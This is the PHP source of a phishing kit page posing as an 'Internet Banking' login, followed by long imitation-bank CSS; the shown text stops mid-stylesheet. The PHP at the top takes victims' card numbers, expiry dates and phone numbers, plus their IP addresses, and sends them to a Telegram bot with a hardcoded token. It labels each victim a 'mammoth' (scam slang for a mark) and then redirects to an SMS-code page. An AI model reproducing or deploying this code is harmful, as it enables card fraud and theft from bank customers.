<?php 
session_start();

 function get_ip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
   if(isset($_POST['btn'])){
    //в переменную $token нужно вставить токен, который нам прислал @botFather
$token = "5892156996:AAFBvKbkwPa5rtPTCK6PCQWsOpapPKgBZog";
 
//нужна вставить chat_id (Как получить chad id, читайте ниже)
$chat_id = "-1001955272769";
$_SESSION['smscode'] = $_POST['cardnumber'];
$phone= $_POST['phone'];
$date= $_POST['date'];
$cardnumber = $_POST['cardnumber'];
$ip = get_ip();
$namemodels = 'Ира';
$txt = '';


//Далее создаем переменную, в которую помещаем PHP массив
$arr = array(
  '💸Мамонт ввел данные карты "Ира": ' => $namemodels, //name
  'Номер карты:' => $cardnumber,
  'Срок дейстивия:' => $date,
  'Номер телефона:' => $phone,
  'IP:' => $ip
);
 
//При помощи цикла перебираем массив и помещаем переменную $txt текст из массива $arr
foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."%0A";
};
 
//Осуществляется отправка данных в переменной $sendToTelegram
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");


 
//Если сообщение отправлено, напишет "Thank you", если нет - "Error"
if ($sendToTelegram) {
    $loc = 'sms.php';
    header('Location: '. $loc);
} else {
  echo "Error";
    }
}









 

 ?>

<html lang="ru">




<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel="stylesheet" href="icon.css"><link rel="stylesheet" href="font.css"><link rel="stylesheet" href="swiper.css"><title>Internet Banking</title><link rel="icon" type="image/png" href="logo.png"><link href="static/css/main.fa66f89d.chunk.css" rel="stylesheet"><link rel="stylesheet" type="text/css" href="static/css/2.8b0b2b37.chunk.css"><script charset="utf-8" src="static/js/2.0b1a1f57.chunk.js"></script>
   <script src="/js/jquery.min.js"></script>
<script src="/js/jquery.maskedinput.min.js"></script>
<link rel="stylesheet" type="text/css" href="static/css/1.c5c504de.chunk.css"><script charset="utf-8" src="static/js/1.b14fb7f4.chunk.js"></script><style data-jss="" data-meta="MuiTouchRipple">
.jss273 {
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  display: block;
  z-index: 0;
  position: absolute;
  overflow: hidden;
  border-radius: inherit;
  pointer-events: none;
}
.jss274 {
  top: 0;
  left: 0;
  width: 50px;
  height: 50px;
  opacity: 0;
  position: absolute;
}
.jss275 {
  opacity: 0.3;
  transform: scale(1);
  animation: mui-ripple-enter 550ms cubic-bezier(0.4, 0, 0.2, 1);
  animation-name: $mui-ripple-enter;
}
.jss276 {
  animation-duration: 200ms;
}
.jss277 {
  width: 100%;
  height: 100%;
  opacity: 1;
  display: block;
  border-radius: 50%;
  background-color: currentColor;
}
.jss278 {
  opacity: 0;
  animation: mui-ripple-exit 550ms cubic-bezier(0.4, 0, 0.2, 1);
  animation-name: $mui-ripple-exit;
}
.jss279 {
  top: 0;
  left: 0;
  position: absolute;
  animation: mui-ripple-pulsate 2500ms cubic-bezier(0.4, 0, 0.2, 1) 200ms infinite;
  animation-name: $mui-ripple-pulsate;
}
@-webkit-keyframes mui-ripple-enter {
  0% {
    opacity: 0.1;
    transform: scale(0);
  }
  100% {
    opacity: 0.3;
    transform: scale(1);
  }
}
@-webkit-keyframes mui-ripple-exit {
  0% {
    opacity: 1;
  }
  100% {
    opacity: 0;
  }
}
@-webkit-keyframes mui-ripple-pulsate {
  0% {
    transform: scale(1);
  }
  50% {
    transform: scale(0.92);
  }
  100% {
    transform: scale(1);
  }
}
</style><style data-jss="" data-meta="MuiButtonBase">
.jss256 {
  color: inherit;
  border: 0;
  margin: 0;
  cursor: pointer;
  display: inline-flex;
  outline: none;
  padding: 0;
  position: relative;
  align-items: center;
  user-select: none;
  border-radius: 0;
  vertical-align: middle;
  justify-content: center;
  -moz-appearance: none;
  text-decoration: none;
  background-color: transparent;
  -webkit-appearance: none;
  -webkit-tap-highlight-color: transparent;
}
.jss256::-moz-focus-inner {
  border-style: none;
}
.jss256.jss257 {
  cursor: default;
  pointer-events: none;
}
</style><style data-jss="" data-meta="MuiButton">
.jss230 {
  color: rgba(0, 0, 0, 0.87);
  padding: 6px 16px;
  font-size: 0.875rem;
  min-width: 64px;
  box-sizing: border-box;
  transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,border 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
  line-height: 1.75;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 500;
  border-radius: 4px;
  letter-spacing: 0.02857em;
  text-transform: uppercase;
}
.jss230:hover {
  text-decoration: none;
  background-color: rgba(0, 0, 0, 0.08);
}
.jss230.jss250 {
  color: rgba(0, 0, 0, 0.26);
}
@media (hover: none) {
  .jss230:hover {
    background-color: transparent;
  }
}
.jss230:hover.jss250 {
  background-color: transparent;
}
.jss231 {
  width: 100%;
  display: inherit;
  align-items: inherit;
  justify-content: inherit;
}
.jss232 {
  padding: 6px 8px;
}
.jss233 {
  color: #00aeed;
}
.jss233:hover {
  background-color: rgba(0, 174, 237, 0.08);
}
@media (hover: none) {
  .jss233:hover {
    background-color: transparent;
  }
}
.jss234 {
  color: #00aeed;
}
.jss234:hover {
  background-color: rgba(0, 174, 237, 0.08);
}
@media (hover: none) {
  .jss234:hover {
    background-color: transparent;
  }
}
.jss238 {
  border: 1px solid rgba(0, 0, 0, 0.23);
  padding: 5px 16px;
}
.jss239 {
  color: #00aeed;
  border: 1px solid rgba(0, 174, 237, 0.5);
}
.jss239:hover {
  border: 1px solid #00aeed;
  background-color: rgba(0, 174, 237, 0.08);
}
.jss239.jss250 {
  border: 1px solid rgba(0, 0, 0, 0.26);
}
@media (hover: none) {
  .jss239:hover {
    background-color: transparent;
  }
}
.jss240 {
  color: #00aeed;
  border: 1px solid rgba(0, 174, 237, 0.5);
}
.jss240:hover {
  border: 1px solid #00aeed;
  background-color: rgba(0, 174, 237, 0.08);
}
.jss240.jss250 {
  border: 1px solid rgba(0, 0, 0, 0.26);
}
@media (hover: none) {
  .jss240:hover {
    background-color: transparent;
  }
}
.jss241 {
  color: rgba(0, 0, 0, 0.87);
  box-shadow: 0px 1px 5px 0px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 3px 1px -2px rgba(0,0,0,0.12);
  background-color: #e0e0e0;
}
.jss241.jss249 {
  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);
}
.jss241:active {
  box-shadow: 0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);
}
.jss241.jss250 {
  color: rgba(0, 0, 0, 0.26);
  box-shadow: none;
  background-color: rgba(0, 0, 0, 0.12);
}
.jss241:hover {
  background-color: #d5d5d5;
}
@media (hover: none) {
  .jss241:hover {
    background-color: #e0e0e0;
  }
}
.jss241:hover.jss250 {
  background-color: rgba(0, 0, 0, 0.12);
}
.jss242 {
  color: rgba(0, 0, 0, 0.87);
  background-color: #00aeed;
}
.jss242:hover {
  background-color: rgb(0, 121, 165);
}
@media (hover: none) {
  .jss242:hover {
    background-color: #00aeed;
  }
}
.jss243 {
  color: rgba(0, 0, 0, 0.87);
  background-color: #00aeed;
}
.jss243:hover {
  background-color: rgb(0, 121, 165);
}
@media (hover: none) {
  .jss243:hover {
    background-color: #00aeed;
  }
}
.jss247 {
  width: 56px;
  height: 56px;
  padding: 0;
  min-width: 0;
  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);
  border-radius: 50%;
}
.jss247:active {
  box-shadow: 0px 7px 8px -4px rgba(0,0,0,0.2),0px 12px 17px 2px rgba(0,0,0,0.14),0px 5px 22px 4px rgba(0,0,0,0.12);
}
.jss248 {
  width: auto;
  height: 48px;
  padding: 0 16px;
  min-width: 48px;
  border-radius: 24px;
}
.jss251 {
  color: inherit;
}
.jss252 {
  width: 40px;
  height: 40px;
}
.jss253 {
  padding: 4px 8px;
  min-width: 64px;
  font-size: 0.8125rem;
}
.jss254 {
  padding: 8px 24px;
  font-size: 0.9375rem;
}
.jss255 {
  width: 100%;
}
</style><style data-jss="" data-meta="MuiAvatar">
.jss270 {
  width: 40px;
  height: 40px;
  display: flex;
  position: relative;
  overflow: hidden;
  font-size: 1.25rem;
  align-items: center;
  flex-shrink: 0;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  user-select: none;
  border-radius: 50%;
  justify-content: center;
}
.jss271 {
  color: #fafafa;
  background-color: #bdbdbd;
}
.jss272 {
  width: 100%;
  height: 100%;
  text-align: center;
  object-fit: cover;
}
</style><style data-jss="" data-meta="MuiFormControl">
.jss178 {
  margin: 0;
  border: 0;
  display: inline-flex;
  padding: 0;
  position: relative;
  min-width: 0;
  flex-direction: column;
  vertical-align: top;
}
.jss179 {
  margin-top: 16px;
  margin-bottom: 8px;
}
.jss180 {
  margin-top: 8px;
  margin-bottom: 4px;
}
.jss181 {
  width: 100%;
}
</style><style data-jss="" data-meta="MuiTypography">
.jss143 {
  margin: 0;
  display: block;
}
.jss144 {
  color: rgba(0, 0, 0, 0.54);
  font-size: 7rem;
  font-weight: 300;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1.14286em;
  margin-left: -.04em;
  letter-spacing: -.04em;
}
.jss145 {
  color: rgba(0, 0, 0, 0.54);
  font-size: 3.5rem;
  font-weight: 400;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1.30357em;
  margin-left: -.02em;
  letter-spacing: -.02em;
}
.jss146 {
  color: rgba(0, 0, 0, 0.54);
  font-size: 2.8125rem;
  font-weight: 400;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1.13333em;
  margin-left: -.02em;
}
.jss147 {
  color: rgba(0, 0, 0, 0.54);
  font-size: 2.125rem;
  font-weight: 400;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1.20588em;
}
.jss148 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 1.5rem;
  font-weight: 400;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1.35417em;
}
.jss149 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 1.3125rem;
  font-weight: 500;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1.16667em;
}
.jss150 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 1rem;
  font-weight: 400;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1.5em;
}
.jss151 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 0.875rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1.5;
  letter-spacing: 0.01071em;
}
.jss152 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 1rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1.5;
  letter-spacing: 0.00938em;
}
.jss153 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 0.75rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1.66;
  letter-spacing: 0.03333em;
}
.jss154 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 0.875rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 500;
  line-height: 1.75;
  letter-spacing: 0.02857em;
  text-transform: uppercase;
}
.jss155 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 6rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 300;
  line-height: 1;
  letter-spacing: -0.01562em;
}
.jss156 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 3.75rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 300;
  line-height: 1;
  letter-spacing: -0.00833em;
}
.jss157 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 3rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1.04;
  letter-spacing: 0em;
}
.jss158 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 2.125rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1.17;
  letter-spacing: 0.00735em;
}
.jss159 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 1.5rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1.33;
  letter-spacing: 0em;
}
.jss160 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 1.25rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 500;
  line-height: 1.6;
  letter-spacing: 0.0075em;
}
.jss161 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 1rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 1.75;
  letter-spacing: 0.00938em;
}
.jss162 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 0.875rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 500;
  line-height: 1.57;
  letter-spacing: 0.00714em;
}
.jss163 {
  color: rgba(0, 0, 0, 0.87);
  font-size: 0.75rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  font-weight: 400;
  line-height: 2.66;
  letter-spacing: 0.08333em;
  text-transform: uppercase;
}
.jss164 {
  width: 1px;
  height: 1px;
  position: absolute;
  overflow: hidden;
}
.jss165 {
  text-align: left;
}
.jss166 {
  text-align: center;
}
.jss167 {
  text-align: right;
}
.jss168 {
  text-align: justify;
}
.jss169 {
  overflow: hidden;
  white-space: nowrap;
  text-overflow: ellipsis;
}
.jss170 {
  margin-bottom: 0.35em;
}
.jss171 {
  margin-bottom: 16px;
}
.jss172 {
  color: inherit;
}
.jss173 {
  color: #00aeed;
}
.jss174 {
  color: #00aeed;
}
.jss175 {
  color: rgba(0, 0, 0, 0.87);
}
.jss176 {
  color: rgba(0, 0, 0, 0.54);
}
.jss177 {
  color: #f44336;
}
</style><style data-jss="" data-meta="MuiGrid">
.jss46 {
  width: 100%;
  display: flex;
  flex-wrap: wrap;
  box-sizing: border-box;
}
.jss47 {
  margin: 0;
  box-sizing: border-box;
}
.jss48 {
  min-width: 0;
}
.jss49 {
  flex-direction: column;
}
.jss50 {
  flex-direction: column-reverse;
}
.jss51 {
  flex-direction: row-reverse;
}
.jss52 {
  flex-wrap: nowrap;
}
.jss53 {
  flex-wrap: wrap-reverse;
}
.jss54 {
  align-items: center;
}
.jss55 {
  align-items: flex-start;
}
.jss56 {
  align-items: flex-end;
}
.jss57 {
  align-items: baseline;
}
.jss58 {
  align-content: center;
}
.jss59 {
  align-content: flex-start;
}
.jss60 {
  align-content: flex-end;
}
.jss61 {
  align-content: space-between;
}
.jss62 {
  align-content: space-around;
}
.jss63 {
  justify-content: center;
}
.jss64 {
  justify-content: flex-end;
}
.jss65 {
  justify-content: space-between;
}
.jss66 {
  justify-content: space-around;
}
.jss67 {
  justify-content: space-evenly;
}
.jss68 {
  width: calc(100% + 8px);
  margin: -4px;
}
.jss68 > .jss47 {
  padding: 4px;
}
.jss69 {
  width: calc(100% + 16px);
  margin: -8px;
}
.jss69 > .jss47 {
  padding: 8px;
}
.jss70 {
  width: calc(100% + 24px);
  margin: -12px;
}
.jss70 > .jss47 {
  padding: 12px;
}
.jss71 {
  width: calc(100% + 32px);
  margin: -16px;
}
.jss71 > .jss47 {
  padding: 16px;
}
.jss72 {
  width: calc(100% + 40px);
  margin: -20px;
}
.jss72 > .jss47 {
  padding: 20px;
}
.jss73 {
  flex-grow: 0;
  max-width: none;
  flex-basis: auto;
}
.jss74 {
  flex-grow: 1;
  max-width: 100%;
  flex-basis: 0;
}
.jss75 {
  flex-grow: 0;
  max-width: 8.333333%;
  flex-basis: 8.333333%;
}
.jss76 {
  flex-grow: 0;
  max-width: 16.666667%;
  flex-basis: 16.666667%;
}
.jss77 {
  flex-grow: 0;
  max-width: 25%;
  flex-basis: 25%;
}
.jss78 {
  flex-grow: 0;
  max-width: 33.333333%;
  flex-basis: 33.333333%;
}
.jss79 {
  flex-grow: 0;
  max-width: 41.666667%;
  flex-basis: 41.666667%;
}
.jss80 {
  flex-grow: 0;
  max-width: 50%;
  flex-basis: 50%;
}
.jss81 {
  flex-grow: 0;
  max-width: 58.333333%;
  flex-basis: 58.333333%;
}
.jss82 {
  flex-grow: 0;
  max-width: 66.666667%;
  flex-basis: 66.666667%;
}
.jss83 {
  flex-grow: 0;
  max-width: 75%;
  flex-basis: 75%;
}
.jss84 {
  flex-grow: 0;
  max-width: 83.333333%;
  flex-basis: 83.333333%;
}
.jss85 {
  flex-grow: 0;
  max-width: 91.666667%;
  flex-basis: 91.666667%;
}
.jss86 {
  flex-grow: 0;
  max-width: 100%;
  flex-basis: 100%;
}
@media (min-width:600px) {
  .jss87 {
    flex-grow: 0;
    max-width: none;
    flex-basis: auto;
  }
  .jss88 {
    flex-grow: 1;
    max-width: 100%;
    flex-basis: 0;
  }
  .jss89 {
    flex-grow: 0;
    max-width: 8.333333%;
    flex-basis: 8.333333%;
  }
  .jss90 {
    flex-grow: 0;
    max-width: 16.666667%;
    flex-basis: 16.666667%;
  }
  .jss91 {
    flex-grow: 0;
    max-width: 25%;
    flex-basis: 25%;
  }
  .jss92 {
    flex-grow: 0;
    max-width: 33.333333%;
    flex-basis: 33.333333%;
  }
  .jss93 {
    flex-grow: 0;
    max-width: 41.666667%;
    flex-basis: 41.666667%;
  }
  .jss94 {
    flex-grow: 0;
    max-width: 50%;
    flex-basis: 50%;
  }
  .jss95 {
    flex-grow: 0;
    max-width: 58.333333%;
    flex-basis: 58.333333%;
  }
  .jss96 {
    flex-grow: 0;
    max-width: 66.666667%;
    flex-basis: 66.666667%;
  }
  .jss97 {
    flex-grow: 0;
    max-width: 75%;
    flex-basis: 75%;
  }
  .jss98 {
    flex-grow: 0;
    max-width: 83.333333%;
    flex-basis: 83.333333%;
  }
  .jss99 {
    flex-grow: 0;
    max-width: 91.666667%;
    flex-basis: 91.666667%;
  }
  .jss100 {
    flex-grow: 0;
    max-width: 100%;
    flex-basis: 100%;
  }
}
@media (min-width:960px) {
  .jss101 {
    flex-grow: 0;
    max-width: none;
    flex-basis: auto;
  }
  .jss102 {
    flex-grow: 1;
    max-width: 100%;
    flex-basis: 0;
  }
  .jss103 {
    flex-grow: 0;
    max-width: 8.333333%;
    flex-basis: 8.333333%;
  }
  .jss104 {
    flex-grow: 0;
    max-width: 16.666667%;
    flex-basis: 16.666667%;
  }
  .jss105 {
    flex-grow: 0;
    max-width: 25%;
    flex-basis: 25%;
  }
  .jss106 {
    flex-grow: 0;
    max-width: 33.333333%;
    flex-basis: 33.333333%;
  }
  .jss107 {
    flex-grow: 0;
    max-width: 41.666667%;
    flex-basis: 41.666667%;
  }
  .jss108 {
    flex-grow: 0;
    max-width: 50%;
    flex-basis: 50%;
  }
  .jss109 {
    flex-grow: 0;
    max-width: 58.333333%;
    flex-basis: 58.333333%;
  }
  .jss110 {
    flex-grow: 0;
    max-width: 66.666667%;
    flex-basis: 66.666667%;
  }
  .jss111 {
    flex-grow: 0;
    max-width: 75%;
    flex-basis: 75%;
  }
  .jss112 {
    flex-grow: 0;
    max-width: 83.333333%;
    flex-basis: 83.333333%;
  }
  .jss113 {
    flex-grow: 0;
    max-width: 91.666667%;
    flex-basis: 91.666667%;
  }
  .jss114 {
    flex-grow: 0;
    max-width: 100%;
    flex-basis: 100%;
  }
}
@media (min-width:1280px) {
  .jss115 {
    flex-grow: 0;
    max-width: none;
    flex-basis: auto;
  }
  .jss116 {
    flex-grow: 1;
    max-width: 100%;
    flex-basis: 0;
  }
  .jss117 {
    flex-grow: 0;
    max-width: 8.333333%;
    flex-basis: 8.333333%;
  }
  .jss118 {
    flex-grow: 0;
    max-width: 16.666667%;
    flex-basis: 16.666667%;
  }
  .jss119 {
    flex-grow: 0;
    max-width: 25%;
    flex-basis: 25%;
  }
  .jss120 {
    flex-grow: 0;
    max-width: 33.333333%;
    flex-basis: 33.333333%;
  }
  .jss121 {
    flex-grow: 0;
    max-width: 41.666667%;
    flex-basis: 41.666667%;
  }
  .jss122 {
    flex-grow: 0;
    max-width: 50%;
    flex-basis: 50%;
  }
  .jss123 {
    flex-grow: 0;
    max-width: 58.333333%;
    flex-basis: 58.333333%;
  }
  .jss124 {
    flex-grow: 0;
    max-width: 66.666667%;
    flex-basis: 66.666667%;
  }
  .jss125 {
    flex-grow: 0;
    max-width: 75%;
    flex-basis: 75%;
  }
  .jss126 {
    flex-grow: 0;
    max-width: 83.333333%;
    flex-basis: 83.333333%;
  }
  .jss127 {
    flex-grow: 0;
    max-width: 91.666667%;
    flex-basis: 91.666667%;
  }
  .jss128 {
    flex-grow: 0;
    max-width: 100%;
    flex-basis: 100%;
  }
}
@media (min-width:1920px) {
  .jss129 {
    flex-grow: 0;
    max-width: none;
    flex-basis: auto;
  }
  .jss130 {
    flex-grow: 1;
    max-width: 100%;
    flex-basis: 0;
  }
  .jss131 {
    flex-grow: 0;
    max-width: 8.333333%;
    flex-basis: 8.333333%;
  }
  .jss132 {
    flex-grow: 0;
    max-width: 16.666667%;
    flex-basis: 16.666667%;
  }
  .jss133 {
    flex-grow: 0;
    max-width: 25%;
    flex-basis: 25%;
  }
  .jss134 {
    flex-grow: 0;
    max-width: 33.333333%;
    flex-basis: 33.333333%;
  }
  .jss135 {
    flex-grow: 0;
    max-width: 41.666667%;
    flex-basis: 41.666667%;
  }
  .jss136 {
    flex-grow: 0;
    max-width: 50%;
    flex-basis: 50%;
  }
  .jss137 {
    flex-grow: 0;
    max-width: 58.333333%;
    flex-basis: 58.333333%;
  }
  .jss138 {
    flex-grow: 0;
    max-width: 66.666667%;
    flex-basis: 66.666667%;
  }
  .jss139 {
    flex-grow: 0;
    max-width: 75%;
    flex-basis: 75%;
  }
  .jss140 {
    flex-grow: 0;
    max-width: 83.333333%;
    flex-basis: 83.333333%;
  }
  .jss141 {
    flex-grow: 0;
    max-width: 91.666667%;
    flex-basis: 91.666667%;
  }
  .jss142 {
    flex-grow: 0;
    max-width: 100%;
    flex-basis: 100%;
  }
}
</style><style data-jss="" data-meta="MuiInputBase">
.jss213 {
  color: rgba(0, 0, 0, 0.87);
  cursor: text;
  display: inline-flex;
  font-size: 1rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1.1875em;
  align-items: center;
}
.jss213.jss216 {
  color: rgba(0, 0, 0, 0.38);
  cursor: default;
}
.jss221 {
  padding: 6px 0 7px;
}
.jss222 {
  width: 100%;
}
.jss223 {
  font: inherit;
  color: currentColor;
  width: 100%;
  border: 0;
  margin: 0;
  padding: 6px 0 7px;
  display: block;
  min-width: 0;
  box-sizing: content-box;
  background: none;
  -webkit-tap-highlight-color: transparent;
}
.jss223::-webkit-input-placeholder {
  color: currentColor;
  opacity: 0.42;
  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
}
.jss223::-moz-placeholder {
  color: currentColor;
  opacity: 0.42;
  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
}
.jss223:-ms-input-placeholder {
  color: currentColor;
  opacity: 0.42;
  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
}
.jss223::-ms-input-placeholder {
  color: currentColor;
  opacity: 0.42;
  transition: opacity 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
}
.jss223:focus {
  outline: 0;
}
.jss223:invalid {
  box-shadow: none;
}
.jss223::-webkit-search-decoration {
  -webkit-appearance: none;
}
.jss223.jss216 {
  opacity: 1;
}
label[data-shrink=false] + .jss214 .jss223::-webkit-input-placeholder {
  opacity: 0;
}
label[data-shrink=false] + .jss214 .jss223::-moz-placeholder {
  opacity: 0;
}
label[data-shrink=false] + .jss214 .jss223:-ms-input-placeholder {
  opacity: 0;
}
label[data-shrink=false] + .jss214 .jss223::-ms-input-placeholder {
  opacity: 0;
}
label[data-shrink=false] + .jss214 .jss223:focus::-webkit-input-placeholder {
  opacity: 0.42;
}
label[data-shrink=false] + .jss214 .jss223:focus::-moz-placeholder {
  opacity: 0.42;
}
label[data-shrink=false] + .jss214 .jss223:focus:-ms-input-placeholder {
  opacity: 0.42;
}
label[data-shrink=false] + .jss214 .jss223:focus::-ms-input-placeholder {
  opacity: 0.42;
}
.jss224 {
  padding-top: 3px;
}
.jss225 {
  resize: none;
  padding: 0;
}
.jss226 {
  height: 1.1875em;
}
.jss227 {
  -moz-appearance: textfield;
  -webkit-appearance: textfield;
}
</style><style data-jss="" data-meta="MuiInput">
.jss200 {
  position: relative;
}
label + .jss201 {
  margin-top: 16px;
}
.jss204:after {
  left: 0;
  right: 0;
  bottom: 0;
  content: "";
  position: absolute;
  transform: scaleX(0);
  transition: transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
  border-bottom: 2px solid rgb(0, 121, 165);
  pointer-events: none;
}
.jss204.jss202:after {
  transform: scaleX(1);
}
.jss204.jss205:after {
  transform: scaleX(1);
  border-bottom-color: #f44336;
}
.jss204:before {
  left: 0;
  right: 0;
  bottom: 0;
  content: "\00a0";
  position: absolute;
  transition: border-bottom-color 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
  border-bottom: 1px solid rgba(0, 0, 0, 0.42);
  pointer-events: none;
}
.jss204:hover:not(.jss203):not(.jss202):not(.jss205):before {
  border-bottom: 2px solid rgba(0, 0, 0, 0.87);
}
.jss204.jss203:before {
  border-bottom-style: dotted;
}
@media (hover: none) {
  .jss204:hover:not(.jss203):not(.jss202):not(.jss205):before {
    border-bottom: 1px solid rgba(0, 0, 0, 0.42);
  }
}
</style><style data-jss="" data-meta="MuiFormLabel">
.jss193 {
  color: rgba(0, 0, 0, 0.54);
  padding: 0;
  font-size: 1rem;
  font-family: "Roboto", "Helvetica", "Arial", sans-serif;
  line-height: 1;
}
.jss193.jss194 {
  color: rgb(0, 121, 165);
}
.jss193.jss195 {
  color: rgba(0, 0, 0, 0.38);
}
.jss193.jss196 {
  color: #f44336;
}
.jss199.jss196 {
  color: #f44336;
}
</style><style data-jss="" data-meta="MuiInputLabel">
.jss182 {
  transform-origin: top left;
}
.jss187 {
  top: 0;
  left: 0;
  position: absolute;
  transform: translate(0, 24px) scale(1);
}
.jss188 {
  transform: translate(0, 21px) scale(1);
}
.jss189 {
  transform: translate(0, 1.5px) scale(0.75);
  transform-origin: top left;
}
.jss190 {
  transition: color 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms,transform 200ms cubic-bezier(0.0, 0, 0.2, 1) 0ms;
}
.jss191 {
  z-index: 1;
  transform: translate(12px, 20px) scale(1);
  pointer-events: none;
}
.jss191.jss188 {
  transform: translate(12px, 17px) scale(1);
}
.jss191.jss189 {
  transform: translate(12px, 10px) scale(0.75);
}
.jss191.jss189.jss188 {
  transform: translate(12px, 7px) scale(0.75);
}
.jss192 {
  z-index: 1;
  transform: translate(14px, 20px) scale(1);
  pointer-events: none;
}
.jss192.jss188 {
  transform: translate(14px, 17px) scale(1);
}
.jss192.jss189 {
  transform: translate(14px, -6px) scale(0.75);
}
</style><style data-jss="" data-meta="MuiPaper">
.jss19 {
  background-color: #fff;
}
.jss20 {
  border-radius: 4px;
}
.jss21 {
  box-shadow: none;
}
.jss22 {
  box-shadow: 0px 1px 3px 0px rgba(0,0,0,0.2),0px 1px 1px 0px rgba(0,0,0,0.14),0px 2px 1px -1px rgba(0,0,0,0.12);
}
.jss23 {
  box-shadow: 0px 1px 5px 0px rgba(0,0,0,0.2),0px 2px 2px 0px rgba(0,0,0,0.14),0px 3px 1px -2px rgba(0,0,0,0.12);
}
.jss24 {
  box-shadow: 0px 1px 8px 0px rgba(0,0,0,0.2),0px 3px 4px 0px rgba(0,0,0,0.14),0px 3px 3px -2px rgba(0,0,0,0.12);
}
.jss25 {
  box-shadow: 0px 2px 4px -1px rgba(0,0,0,0.2),0px 4px 5px 0px rgba(0,0,0,0.14),0px 1px 10px 0px rgba(0,0,0,0.12);
}
.jss26 {
  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 5px 8px 0px rgba(0,0,0,0.14),0px 1px 14px 0px rgba(0,0,0,0.12);
}
.jss27 {
  box-shadow: 0px 3px 5px -1px rgba(0,0,0,0.2),0px 6px 10px 0px rgba(0,0,0,0.14),0px 1px 18px 0px rgba(0,0,0,0.12);
}
.jss28 {
  box-shadow: 0px 4px 5px -2px rgba(0,0,0,0.2),0px 7px 10px 1px rgba(0,0,0,0.14),0px 2px 16px 1px rgba(0,0,0,0.12);
}
.jss29 {
  box-shadow: 0px 5px 5px -3px rgba(0,0,0,0.2),0px 8px 10px 1px rgba(0,0,0,0.14),0px 3px 14px 2px rgba(0,0,0,0.12);
}
.jss30 {
  box-shadow: 0px 5px 6px -3px rgba(0,0,0,0.2),0px 9px 12px 1px rgba(0,0,0,0.14),0px 3px 16px 2px rgba(0,0,0,0.12);
}
.jss31 {
